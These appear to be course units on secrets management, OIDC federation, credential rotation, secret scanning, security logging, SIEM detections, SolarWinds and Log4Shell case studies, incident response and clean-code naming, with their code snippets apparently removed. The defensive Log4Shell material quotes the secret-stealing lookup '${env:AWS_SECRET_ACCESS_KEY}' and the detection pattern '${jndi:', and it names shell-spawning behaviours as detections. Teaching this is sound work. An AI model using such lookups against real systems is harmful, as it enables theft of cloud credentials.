Pitfalls and trade-offs Secret sprawl: the same key copied into five CI systems, two wikis and a Slack message. Count where each secret lives; aim for one. The "god" secret: one credential with admin rights shared by every service. Scope each secret to one consumer and the least privilege it needs. Logging secrets: request logs that include Authorization headers or full URLs with tokens. Redact at the logging layer. Availability: if an uncached startup fetch needs an unavailable store, the service may fail to start. Cache secrets briefly and run the store highly available. Encrypted secrets in git (SOPS, Sealed Secrets) are a reasonable GitOps pattern, but the decryption key becomes the new crown jewel. Key takeaways Secret stores provide access, version and audit facilities whose coverage depends on configuration. Check the SDK provider chain so a stored key does not silently override the intended workload role. Kubernetes Secret data is encoding rather than encryption; API permissions remain essential. Limit credential scope, cached lifetime and copies, while planning store availability. Further reading OWASP secrets management Boto3 credentials Kubernetes Secrets good practices

sum: Understand leases, revocation failures and the limits of attribution.
x: Short-lived credentials aim to reduce how long a stolen value can be reused. A database credential created on demand has a different lifecycle from a shared static password: creation, lease renewal and revocation all need to work with the target database. Short-lived and dynamic credentials Reducing credential lifetime limits reuse only when expiry or revocation is enforced by the system accepting it. It does not undo access or data theft that happened before expiry. Dynamic secrets are generated on demand. Vault's database secrets engine, for example, can create a unique database credential per request with a lease (say one hour). Expiry/revocation triggers the configured database revocation operation; successful removal depends on connectivity, permissions and database semantics. Leases may also be renewable. Revocation attempts the configured database operation; monitor failures. Benefits: A properly enforced lease bounds use; failed revocation must be detected and repaired. If each instance obtains a distinct credential and database auditing is enabled, logs identify that credential; theft means they cannot prove which actor used it. Revoking a credential used only by one instance limits the operational scope; shared credentials or dependent sessions can complicate this. The same idea applies everywhere: AWS AssumeRole sessions can request 15 minutes up to the role's configured maximum of 1–12 hours; role chaining has a one-hour limit. Other STS APIs have different duration rules; GCP and Azure have equivalents. Key takeaways On-demand credentials can separate requesters and narrow the scope of revocation. A lease requires effective expiry or revocation; monitor failed database operations. An audit record identifies a credential, not necessarily the person using a stolen credential. AWS session-duration limits vary by API and role-chaining context. Further reading Vault database secrets Vault lease and revocation AWS AssumeRole duration

sum: Replace stored cloud keys with job identity and constrain which jobs may assume a role.
x: Federation moves the trust decision from possession of a long-lived stored cloud key to validation of a short-lived identity token. The cloud must verify the issuer, audience and permitted subject as well as the rest of its policy. A compromised matching workflow can still receive credentials. OIDC federation: no stored keys in CI CI pipelines used to store a long-lived cloud access key as a CI secret, exactly the kind CircleCI lost. With OIDC federation, the CI platform instead issues a signed, short-lived JSON Web Token describing the job ("repo acme/api, branch main, workflow deploy"), and the cloud exchanges it for temporary credentials. On AWS, the IAM role's trust policy pins what token it accepts: (This is a schematic legacy-subject-format fragment, not directly executable JSON: key names split across lines must be joined. GitHub repositories created after 15 July 2026, renamed or transferred after that date, or opting into immutable subjects include owner/repository IDs in sub on GitHub.com; GitHub Enterprise Server does not provide this immutable format. Inspect the actual subject format. Environment jobs use an environment subject instead of this branch form.) Federation removes the need to store that long-lived cloud access key. A matching job still needs permission to request an OIDC token (id-token: write) and must satisfy the full trust policy. A branch subject identifies a repository/ref, not one particular workflow; protect workflow changes and branch/environment rules. The sub condition is the security A trust policy that checks only the audience claim, or uses a wildcard such as repo:acme/, broadens which matching jobs could assume the role if they can obtain the required token. A fork PR does not automatically receive token permission; event type, workflow permissions, approvals and environment protections matter. Key takeaways OIDC federation removes a stored cloud key while preserving a policy-controlled credential exchange. Match the actual subject format and intended audience; repository/ref subjects do not identify a single workflow. Protect workflow changes, token permissions and deployment environments. Short-lived credentials still need least privilege, monitoring and compromise response. Further reading GitHub OIDC reference and immutable subjects GitHub OIDC for AWS

sum: Coordinate consumers and credential validity through a controlled changeover.
x: Rotation changes both a stored value and the system that accepts it. Updating a secret-store label alone cannot make a database accept two passwords. Begin with the target's overlap capabilities and a plan for consumers that cache credentials or read them only at startup. Rotation Successful rotation limits reuse of the retired value and exercises the changeover before an emergency. Merely scheduling rotation does not prove that consumers or target revocation work. The hard part is doing it without downtime. The standard pattern keeps two credentials valid during a changeover: Create a new credential alongside the old one. Deploy/propagate it so all consumers start using it. Verify nothing still uses the old one (check audit logs). Revoke the old one. AWS Secrets Manager uses version labels (AWSPENDING, AWSCURRENT, AWSPREVIOUS) and supports rotation workflows. Labels alone do not make two database passwords valid: the target must support overlap, for example through alternating users or dual-password support; single-user rotation has different transition behavior. Applications that fetch the secret at runtime (with a short cache) pick up the new value without a redeploy. Applications that read a secret once at boot need a restart, which is a reason to prefer runtime fetching. Key takeaways Where overlap is supported, create, propagate, verify and then revoke. Secret-store version labels coordinate values; target database semantics determine what is accepted. Runtime fetching with a bounded cache and startup-only loading have different rollout requirements. Further reading AWS rotation OWASP secrets management

sum: Calculate an empirical entropy score while recognising that a score is not proof of a secret.
x: Pattern scanning and character statistics can help find exposed credentials, but neither identifies every secret or proves that a string is unpredictable. This unit computes the empirical character-frequency score, then explains why apparently random hashes and ordinary identifiers can trigger it. Catching leaks: secret scanning Prevention fails, so detect leaks early: Pre-commit hooks (gitleaks, detect-secrets) can block recognised secret patterns before commit, when installed and not bypassed. Push protection (GitHub secret scanning) can reject pushes containing supported secret formats, subject to enablement and bypass policy. Repository and history scanning finds what slipped through earlier. Some scanners combine patterns for known formats (this illustrative regex detects an AKIA prefix followed by 16 uppercase letters/digits; temporary AWS access-key IDs use other prefixes such as ASIA, and an ID alone is not the secret key) with an entropy score: random keys look more random than code. One score used by secret scanners is empirical character-frequency Shannon entropy, worked out from how often each character appears in the candidate string. It measures how "mixed" the characters are, in bits per character: The code below implements the frequency-weighted sum from the formula; each distinct character contributes once: This function computes empirical character-frequency Shannon entropy, in bits per character; it does not measure the unpredictability of the process that generated a particular string. A string using 2 symbols equally often scores 1.0; 4 symbols, 2.0. Working two strings through by hand: A finite sample's empirical score need not equal its generating distribution's entropy: a sample shorter than 64 characters cannot use all 64 base64 data characters evenly, so its empirical score is below 6 bits per character. By the same calculation get_user_by_id scores about 3.3. An entropy score alone produces false positives (hashes, UUIDs), so tools combine it with context like variable names (password =, api_key:). Key takeaways Use pre-commit, push and history scans as complementary leak-detection points. An access-key ID pattern does not establish possession of the secret key. Empirical character entropy describes frequencies in a sample rather than the randomness of its generator. Combine patterns, context and review; low or high scores alone do not settle whether a value is sensitive. Further reading Yelp detect-secrets entropy implementation GitHub push protection OWASP secrets management

t: Dwell time and structured security events
sum: Measure discovery delay and record useful events without logging credentials.
x: Prevention can fail through an unknown vulnerability, a phished password or a poisoned dependency. How quickly you notice and how well you respond can materially affect the outcome, alongside attacker access, system design and operational impact. Security people measure this as dwell time: how long an attacker is inside before being detected. Dwell time stops at detection: containment and recovery come later and are measured separately. Mandiant's M-Trends 2026 reports a 14-day global median for the 2025 investigations in its dataset, up from 11 days for 2024. These are incident-response sample statistics, not a measurement of every intrusion. Changes in detection, attacker behavior and case mix can affect the result; the trend alone does not prove one cause. What to log Missing telemetry limits retrospective detection; live monitoring, user reports and external notifications can also reveal incidents. Useful security events include: Category Examples ------ Authentication Logins, failures, MFA changes Authorisation Access denied, privilege changes Admin actions User created, config changed Data access Exports, bulk reads, downloads Infrastructure Cloud API calls, DNS, egress Each event needs who (user, service, source IP), what (action, resource), when (UTC timestamp, synchronised clocks), where (host, service) and outcome (success or failure). Log in a structured format so machines can query it: Don't log secrets Never log passwords, session tokens, API keys or full card numbers. Log4Shell attackers used lookups such as ${env:AWS_SECRET_ACCESS_KEY} precisely because logs and environments are full of them. Avoid passing secrets to logging APIs and apply central redaction as an additional safeguard; redaction cannot reliably infer every secret. Key takeaways Dwell time ends at detection, before containment and recovery. Incident-response sample medians describe the sampled investigations, not every intrusion. Record who, what, when, where and outcome in machine-readable events. Keep secrets out of logging calls and treat redaction as an additional safeguard. Further reading OWASP logging Mandiant M-Trends 2026

sum: Separate protected evidence storage from source truthfulness and calculate aged-out evidence.
x: A security event is useful only if responders can still access and interpret it. Central collection and protected retention help preserve records after host compromise, while clock synchronisation helps correlate them. They do not guarantee that a compromised source reports every event truthfully. Keep logs trustworthy An intruder may delete logs to cover their tracks (MITRE ATT&CK technique T1070, Indicator Removal). So: Ship logs off the host quickly to a central store the host cannot modify. Use append-only or write-once storage (for example S3 Object Lock) for critical audit trails. Synchronise clocks (NTP); correlating events across systems with skewed clocks is miserable. Set log retention to match how long incidents take to find. With 7-day retention and a 10-day intrusion, early evidence may be lost even though later events remain. Log retention should reflect investigation needs, risk, cost and data-protection requirements, not only a population median. How much of an intrusion has already aged out of your logs is a subtraction: This assumes logs are deleted exactly R days after they are written and nothing was archived elsewhere. If T_dwell is shorter than R, nothing has aged out under these assumptions. Other causes of missing telemetry remain possible. Key takeaways Send logs to a separately protected collector and monitor gaps. Configure appropriate storage immutability and access policy. Retention must reflect investigation needs, risk, cost and data-protection requirements. The retention calculation assumes exact deletion timing and no separate archive. Further reading OWASP logging MITRE Indicator Removal S3 Object Lock

sum: Trace event-window boundaries and distinguish a teaching sketch from a production detector.
x: A SIEM turns collected telemetry into queries and alerts. Here the detector maintains recent failed-login times separately for each source IP. Its exact boundary and repeated-alert behaviour matter; the queue alone is not a complete production detection service. From logs to detections A SIEM (security information and event management system, such as Splunk, Elastic Security, Microsoft Sentinel or Google SecOps) collects logs centrally, normalises them and runs security detection rules over them. A simple in-memory rule alerts after more than 5 failed logins from one IP in a 60-second window. It assumes nondecreasing event timestamps per IP and a trusted clock. Production detection needs late-event handling, bounded/expired per-IP state, rate controls and deduplication; this sketch deliberately omits them. For each IP address, every new failed login moves a sliding window of the last 60 seconds forwards and counts what is inside it: The code keeps each IP's recent timestamps in a queue, drops from the front everything at or before t_cut, then compares how many are left, N, with L: Sigma provides a common detection-rule format. Conversion requires a supported backend and correct log-source/field mapping; not every rule maps automatically to every SIEM: Key takeaways Events at or before the cutoff are removed; events after it remain. The sketch alerts on every event while the retained count exceeds five. Nondecreasing trusted timestamps are an explicit assumption. Production use also needs bounded state, late-event policy, rate controls and deduplication. Further reading Python deque Sigma security detection rules OWASP logging

sum: Use the Pyramid of Pain and a base-rate calculation to reason about useful alerts.
x: A detector can match a particular file or infrastructure address, or it can look for how an intrusion operates. This unit compares those signals and calculates why a small false-positive rate can overwhelm a response team when harmless events greatly outnumber attacks. The pyramid of pain Not all indicators are equally useful. David Bianco's Pyramid of Pain ranks them by how much it hurts the attacker when you detect them: Changing a file usually changes its cryptographic hash; recompilation is not guaranteed to change bytes. Infrastructure addresses can also be replaced. Detecting behaviour ("a web server process spawned a shell", "a server made an outbound LDAP connection") can require a change in technique, but cost depends on the attacker and a particular behaviour may be avoidable. Alert fatigue Many security detection rules produce false positives; their rates depend on context and tuning. A SOC drowning in thousands of low-quality alerts a day will miss the real one. A real alert can be missed when ownership, triage or escalation fails. Content gap The detailed Target alert chronology is omitted because this review did not obtain a primary incident record establishing the claimed sequence. Keep detections healthy: Measure precision: what fraction of alerts from each rule were real? Tune or delete rules that are always noise. Add context automatically: asset owner, user's normal location, recent changes. Tier alerts: page a human only for high-confidence, high-impact detections. Test detections: re-run known attack techniques (for example with Atomic Red Team) and check the alert fires. Precision is a ratio, and it explains why noise is so hard to escape. Real attacks are rare compared with normal activity (a low base rate), so a rule that is wrong on only a tiny fraction of harmless events can still produce mostly false alarms. An illustrative calculation with made-up numbers: 1,000,000 harmless logins a day, 2 real attacks, and a rule that catches both attacks but misfires on 0.1 % of harmless logins: To raise P, cut FP: narrow the rule, add context so it fires only on unusual combinations, or tier it so low-confidence matches enrich other alerts instead of paging someone. Catching more real attacks (TP) barely helps while FP is in the thousands. Key takeaways Behavioural detections can force changes to attacker technique, although any one behaviour may be avoidable. Alert quality depends on context, ownership and triage. Precision counts real alerts among all alerts; false-positive rate counts flagged harmless events among harmless events. Test rules, enrich context and tune noisy paging paths. Further reading The Pyramid of Pain, original author Precision and false-positive rate Atomic Red Team

sum: See how identity anomalies and runtime behaviour complement literal payload matching.
x: Two historical incidents show why a known-file signature or one literal input pattern is incomplete. SolarWinds emerged from investigation of an identity anomaly; Log4Shell payloads changed spelling while the vulnerable lookup behaviour and some runtime effects remained. Case study: how SolarWinds was finally caught SUNBURST was designed to evade detection: It waited up to two weeks after installation before doing anything. Its traffic imitated the legitimate Orion Improvement Program protocol. It checked for security tools and stayed quiet if it found them. The follow-on intruders used hostnames matching the victim's naming scheme and IP addresses in the victim's own country. The campaign spanned months, but installation, follow-on compromise and detection dates differed by organisation; a uniform nine-month dwell time for every customer is not supported. It was the security firm FireEye that eventually noticed, in late 2020, when it found it had been breached itself. In Senate testimony, Kevin Mandia confirmed that an unexpected additional authentication verifier was a tip-off. Details of a particular employee phone call are omitted here because the primary testimony checked does not establish them. The suspicious identity event helped initiate a much broader investigation; it did not alone establish the whole campaign. FireEye disclosed it on 13 December 2020, and the US CISA issued an emergency directive ordering federal agencies to disconnect Orion. Lesson High-value detections are often about identity and behaviour, not malware signatures: new MFA devices, impossible travel, a service account logging in interactively, a server talking to a new external domain. Case study: detecting Log4Shell Log4Shell was disclosed on 9 December 2021. Cloudflare saw the first exploitation attempt nine minutes later, and found scanning as early as 1 December, eight days before disclosure. Defenders' first reflex was a rule matching ${jndi: in request logs. Attackers adapted within hours, using Log4j's own lookup syntax to disguise the string: These examples illustrate nested/default lookups that can construct jndi without containing the literal ${jndi: pattern in raw input. The environment-default example assumes X is absent; runtime configuration matters. Cloudflare's advice was to treat any ${ in input as suspicious. Better still were detections higher up the pyramid: Egress: unexpected outbound LDAP/RMI connections may be useful warning signs. Restrict unnecessary egress according to the application baseline; some applications legitimately use these protocols, and these blocks do not cover every exploit/exfiltration path. Process behaviour: a Java process spawning sh, curl or powershell. DNS: lookups of unusual subdomains from servers (many scanners used DNS callbacks). And remember the payload can arrive through any logged field, not just HTTP: usernames, email subjects, even device names. String-matching on the web tier would never see those. Key takeaways An unexpected authentication verifier was an investigative clue rather than proof of the whole SolarWinds campaign. Nested Log4j lookups can evade a literal raw-input pattern. Patching addresses the vulnerable implementation; egress and process detections add path-specific coverage. Logged fields outside the web edge also matter. Further reading SolarWinds Senate testimony Mandiant SUNBURST analysis Cloudflare Log4Shell observations Apache Log4j advisories

sum: Choose incident-specific containment while preserving useful evidence where feasible.
x: Detection starts a response, not a fixed script. Responders need roles, a timeline and a view of ongoing harm before choosing containment and recovery steps. The lifecycle below distinguishes a familiar historical teaching diagram from NIST's current guidance. Incident response The following teaching diagram is the older NIST SP 800-61 Revision 2 four-phase model. NIST SP 800-61 Revision 3 (April 2025) supersedes it and integrates incident response with CSF 2.0, including Govern/Identify/Protect preparation and Detect/Respond/Recover activities plus continual improvement: Preparation Done before anything happens: an IR plan, named roles (incident commander, communications, scribe), on-call rotas, contact lists for legal and regulators, logging already set up, and practice through tabletop exercises. Detection and analysis Confirm it is real, establish scope (which systems, accounts, data) and severity. Start a timeline and a written log of every action taken. Containment, eradication and recovery Containment stops the bleeding: isolate hosts, disable accounts, revoke credentials, block domains. There is a real tension: Contain prematurely and noisily, and a sophisticated attacker realises they are seen, changes tactics or triggers destructive actions. Contain too late, and they keep stealing data. For a commodity ransomware infection, contain immediately. For a stealthy, persistent intruder, teams sometimes scope quietly first, then evict the attacker everywhere at once. Preserve evidence before you wipe anything. Collect in order of volatility (RFC 3227): prioritise the most volatile relevant evidence, such as CPU registers and caches, memory contents, network connections and running processes, before less volatile storage. The order depends on the system, including temporary filesystems and remote logs. Rebooting usually destroys volatile evidence and may leave persistent malware intact. Balance evidence collection with urgent containment and safety; do not delay essential protective action merely to preserve evidence. Eradication removes the attacker's footholds: malware, backdoor accounts, persistence mechanisms, compromised credentials and any others the investigation identifies as exposed (revoke or rotate them). Recovery restores service, often by rebuilding from known-good images rather than cleaning, and monitors closely for return. Key takeaways Prepare plans, roles, contact routes, telemetry and rehearsal before an incident. Containment timing depends on harm, evidence and operational safety; coordinated eviction is not a reason for indefinite delay. Rebooting can destroy volatile evidence while leaving persistence intact. Eradicate footholds and restore trusted service while monitoring for return. Further reading NIST SP 800-61 Rev. 3 Historical NIST SP 800-61 Rev. 2 RFC 3227 evidence collection

sum: Turn incident findings into owned safeguards and prepare timely notification decisions.
x: Restoring service does not finish the learning and communication work. A postmortem should explain the conditions that made the incident possible and assign concrete changes. A notification assessment also needs prepared decision-makers: investigation can continue while initial regulatory information is supplied. Post-incident activity Run a blameless postmortem: what happened, why, what made it worse, and what will change, with owners and dates. "Blameless" does not mean nobody is accountable; it means you assume people acted reasonably with the information they had, so they tell you the truth. Blaming individuals teaches everyone to hide mistakes. Also consider legal duties. For a reportable personal-data breach, the UK GDPR controller must notify the ICO without undue delay and, where feasible, within 72 hours of awareness. The exception is where risk to individuals' rights and freedoms is unlikely; delayed notification needs reasons and information may be supplied in phases. EU GDPR Article 33 uses the same core rule for its competent authority. Other duties, such as processor-to-controller notice or high-risk individual notification, differ; seek jurisdiction-specific advice for an actual incident. Apply the lessons For an accidental object-storage exposure, reconstruct the configuration change and the evidence of access. Ask which guardrails could have prevented the exposure, which review or detection could have caught it sooner, and who owns each improvement. Verify whether proposed public-access settings cover the relevant access paths rather than assuming one setting fixes every case. Record the awareness time, the notification threshold assessment, available facts and any reason for delay. Incomplete scope is a reason to communicate uncertainty and update information, rather than automatically waiting until every forensic question is answered. Separate duties to a regulator, affected individuals and a customer acting as controller: their triggers and timing can differ. These are preparation principles; an actual incident needs the applicable jurisdiction-specific assessment. Key takeaways Blameless learning records actions and assigns improvement owners without making punishment the primary goal. For a reportable UK GDPR breach, notify without undue delay and, where feasible, within 72 hours of awareness. The 72-hour point is not permission to wait unnecessarily, and information can be supplied in phases. Prepare separate routes for regulator, controller and individual notifications where applicable. Further reading Google SRE postmortem culture ICO breach guidance AWS S3 Block Public Access

t: Names that carry intent and units
sum: Name booleans as questions and use the domain vocabulary.
x: Code is written once and read many times: by reviewers, by the on-call engineer at 3 a.m., by you in six months. Every minute a reader spends working out what d or process() means is a minute not spent on the actual problem. "Clean code" is not about elegance for its own sake. It is about lowering the cost of the next change. Most of that cost comes from two things you control on every line: names and functions. Why readability is an economic argument A program that works but is hard to read is like a house with no labels on the fuse box. It's fine until something goes wrong. Reading dominates. Before you change a line, you read the code around it, its callers and its tests. The exact ratio varies by task; no measured ratio is established here. Bugs hide in confusion. If a reviewer can't tell what a function is meant to do, they can't tell whether it does it. Design stamina. Martin Fowler's design stamina hypothesis proposes that investing in structure can repay its initial cost through easier later changes. His suggested payoff after weeks is explicitly a judgment, not a measured universal crossover. Clean code is a property of the reader's experience, so the test is simple: can a competent colleague who has never seen this code understand it quickly and change it safely? Naming A name is the smallest unit of documentation. It is read every time the code is read, and it never goes out of date as quietly as a comment does. Reveal intent Compare: The second version needs no comment. The reader knows what goes in, what comes out, and roughly what happens. Put units and meaning in the name Ambiguous units cause real failures. NASA's Mars Climate Orbiter was lost in 1999 because one piece of software produced pound-force seconds and another expected newton seconds. One pound-force second is about 4.45 newton seconds, so the navigation software underestimated the effect of each small thruster firing by that factor. Better still, use a type that carries the unit, such as Python's datetime.timedelta(seconds=30). Name length should match scope A loop index used for two lines can be i. A module-level constant used across a codebase deserves a full name. The wider the scope, the more context a reader has lost by the time they meet the name, so the name must carry more. Scope Example ------ 2-line loop i, row Function unpaid_invoices Module/global MAX_LOGIN_ATTEMPTS Other naming rules that pay off Booleans read as predicates: is_active, has_permission, should_retry. Avoid flag or status. Functions are verbs, values are nouns: send_invoice(), invoice. One word per concept. Don't use fetch, get and retrieve for the same idea in one codebase; readers will assume they differ. Avoid noise words: data, info, manager, handle. UserData versus User tells the reader nothing extra. Avoid encodings. Type-encoding prefixes such as strName often duplicate what the type system and editor already tell you. Hungarian notation is a broader family of conventions: semantic prefixes that distinguish units or kinds are a different design choice. Use the domain's language. If the business says "policy holder", don't call it customer in the code. Magic numbers A bare literal forces readers to guess its meaning and makes changes error-prone. Not every literal is magic: 0, 1, and len(x) - 1 are usually clear in context. Key takeaways Name booleans as questions and use the domain vocabulary. Include units or use a unit-bearing type when a number could be misread. Give wider-scope identifiers enough context and replace unexplained literals. Further reading peps.python.org science.nasa.gov DesignStaminaHypothesis

sum: Extract a function when its name explains intention better than the implementation.
x: Readable functions expose intention, make calls unambiguous and preserve the behaviour callers already rely on. Functions Do one thing A function should do one thing, do it well, and do only that. A practical test: can you describe it in one sentence without "and"? If you can extract a meaningful sub-function from it with a name that isn't just a restatement, it was doing more than one thing. Fowler offers a sharper rule: separate intention from implementation. If you have to read a block of code to work out what it does, extract it into a function named after the what. Then the length of the function matters much less than whether its name tells the truth. One level of abstraction Mixing high-level steps with low-level detail makes a function hard to skim. These checkout fragments illustrate organisation; the tax rule and service calls are placeholders, not a complete tax or transaction implementation. The "after" version tells a story at one altitude. The details still exist, but each lives in a function where it is the main subject. Key takeaways Extract a function when its name explains intention better than the implementation. Keep orchestration at one level of abstraction. Function length is a heuristic; extra indirection needs to earn its place. Further reading FunctionLength pyguide

sum: Keyword-only arguments prevent silent positional mix-ups.
x: Readable functions expose intention, make calls unambiguous and preserve the behaviour callers already rely on. This unit concentrates on the information available at a call site. A positional call relies on the reader remembering the parameter order. Keyword arguments spell out the mapping.
